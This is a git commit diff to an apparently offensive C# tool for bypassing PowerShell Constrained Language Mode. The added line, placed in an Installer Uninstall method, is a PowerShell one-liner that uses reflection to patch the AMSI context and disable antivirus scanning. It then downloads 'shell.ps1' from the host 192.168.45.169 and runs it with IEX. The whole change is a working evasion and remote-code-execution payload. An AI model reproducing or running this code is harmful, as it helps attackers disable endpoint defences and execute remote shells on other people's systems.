c025719d46556f96eae8bd324f683932a23c8ffe
sirjan <sirja@ZIZKA>
2025-09-23 07:26:30 +0200

    CLM bypass combo with AMSI bypass

--- singlefire_clmbypass/singlefire_clmbypass/Program.cs
+++ singlefire_clmbypass/singlefire_clmbypass/Program.cs
@@ -18,7 +18,7 @@ namespace singlefire_clmbypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "C:\\Users\\will\\Desktop\\classical.exe";
+            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); (New-Object Net.WebClient).DownloadString('http://192.168.45.169/shell.ps1') | IEX";
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
